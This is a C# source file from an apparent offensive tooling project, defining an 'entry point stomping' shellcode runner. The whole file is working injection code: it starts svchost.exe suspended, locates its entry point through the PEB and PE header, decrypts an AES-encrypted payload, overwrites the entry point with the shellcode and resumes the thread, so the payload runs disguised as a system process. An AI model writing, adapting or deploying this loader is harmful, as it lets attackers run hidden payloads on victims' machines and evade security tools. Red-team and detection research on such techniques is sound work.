using System;
using System.Runtime.InteropServices;
using NetRunners.Interfaces;
using static NetRunners.Decryptors.AesDecryptor;
using static NetRunners.Helpers.Helper;
using static NetRunners.Delegates.Delegate;
using static NetRunners.Data.Structs;
using static NetRunners.Data.EncryptedData;

namespace NetRunners.Runners
{
    /// <summary>
    /// This class contains the EntryPoint Stomping Shellcode Runner (Special Thanks 2 cpu0x00!)
    /// </summary>
    public class EntryPointStompingRunner : IRunner
    {
        public void Run()
        {
            try
            {
                IntPtr addressOfEntryPoint;
                IntPtr hProcess;
                IntPtr nRead;
                IntPtr ptrToImageBase;
                IntPtr svchostBase;
                byte[] addrBuf;
                byte[] data;
                int result;
                uint e_lfanew_offset;
                uint entrypoint_rva;
                uint opthdr;
                STARTUPINFO si = new STARTUPINFO();
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
                var payload = GetPayloadAndSize();
                byte[] buf = GetPayload();

                // create suspended svchost process
                result = CreateProcessA(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, 0, 0x4, IntPtr.Zero, null, ref si, out pi);
                if (result == 0) // false
                    throw new InvalidOperationException($"CreateProcessA failed with error code: {Marshal.GetLastWin32Error()}");

                // fetch PEB address using zwqueryinfo
                uint tmp = 0;
                hProcess = pi.hProcess;
                ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

                ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

                // fetch address of the code base
                addrBuf = new byte[IntPtr.Size];
                nRead = IntPtr.Zero;
                ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

                svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

                // parse PE header to locate entrypoint
                data = new byte[0x200];
                ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

                e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
                opthdr = e_lfanew_offset + 0x28;
                entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
                addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

                //decrypt buf
                try
                {
                    buf = DecryptBytesToBytesAes(buf, AesKey);
                }
                catch (Exception e)
                {
                    throw new InvalidOperationException("Decryption of buffer failed.", e);
                }

                // write shellcode to memory
                WriteProcessMemory(hProcess, addressOfEntryPoint, buf, sBuf, out nRead);

                // resume thread
                ResumeThread(pi.hThread);
            }
            catch (Exception e)
            {
                Console.WriteLine($"An error occurred: {e.Message}");
                throw;
            }
        }
    }
}
